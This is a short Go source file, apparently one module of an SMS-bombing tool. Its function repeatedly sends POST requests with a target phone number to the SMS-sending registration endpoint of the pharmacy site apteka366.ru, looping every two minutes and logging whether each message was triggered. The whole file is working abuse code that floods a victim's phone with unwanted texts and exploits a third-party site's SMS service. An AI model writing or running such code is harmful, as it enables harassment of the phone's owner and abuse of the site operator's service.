package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func apteka366() {
	req := newreq()
	req.SetBodyString("phone=" + num[1:])
	req.SetRequestURI("https://apteka366.ru/login/register/sms/send")
	req.Header.SetMethod("POST")

	timeout := time.Minute*2 + time.Second*2
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `{"phone":"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
